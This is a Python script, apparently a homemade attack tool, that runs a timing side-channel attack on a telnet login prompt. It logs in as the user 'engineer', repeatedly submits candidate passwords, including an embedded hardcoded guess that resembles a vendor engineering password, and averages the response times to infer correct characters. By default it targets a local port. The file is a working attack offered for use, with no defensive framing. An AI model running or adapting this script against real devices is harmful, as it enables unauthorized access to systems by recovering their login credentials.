__version__ = '0418'


import telnetlib
import time
import logging
import numpy as np


#log = logging.getLogger()
#log.setLevel(logging.DEBUG)
class try_timeing_attack():
    def __init__(self, host, port, timeout=30):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.username = b'engineer' + b'\n'
        self.passwd = None
        self.login_prompt = b'Login:'
        self.passwd_promot = b'Password:'
        self.authen_failed = b'Authentication failed'
        
        self.char_list = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
                          'A', 'B', 'C', 'E', 'S', 
                          'a', 'b', 'c', 'd', 'e', 'f', 'g', 't', 'n',
                          '@']
        self.attemp_list = [bytes(i*10 + '\n', 'utf-8') for i in self.char_list]
        self.attemp_list.append(b'S3ag@teEnb' + b'\n')
        
        self.result_list = {}
        
    def try_timeing_attack(self):
        self.connection = telnetlib.Telnet(self.host, self.port, self.timeout)
        self.connection.write(b'\n')
        response = self.connection.read_until(b'Password:', self.timeout)
        self.connection.write(b'\n')
        print('first time to read the promot:{}'.format(response))
        response = self.connection.read_until(self.login_prompt, self.timeout)
        print('first time of response: {}'.format(response))
        
        # try to run timing attacking
        print('try to run timing attacking')
        for j in range(len(self.attemp_list)):
            test_result = []
            for i in range(5000):                   # perform 500x verification
                # write the username
                self.connection.write(self.username)
                response = self.connection.read_until(self.passwd_promot, self.timeout)
                #logging.info('begin to write passwd')
                print('read: {}, begin to write passwd'.format(response))
                self.connection.write(self.attemp_list[j])
                start_time = time.time()
                response = self.connection.read_until(self.authen_failed, self.timeout)
                end_time = time.time()
                #logging.info('response: {}'.format(response))
                print('response: {}'.format(response))
                test_result.append(end_time - start_time)                
            self.result_list.update({self.attemp_list[j]:np.mean(test_result)})

        return self.result_list
        
        #logging.info(self.resylt_list)
        #print()
        
        
                
                
                
if __name__ == '__main__':
    fun = try_timeing_attack(host='127.0.0.1', port='3000', timeout=30)
    #logging.info(fun.try_timeing_attack())
    print(fun.try_timeing_attack())
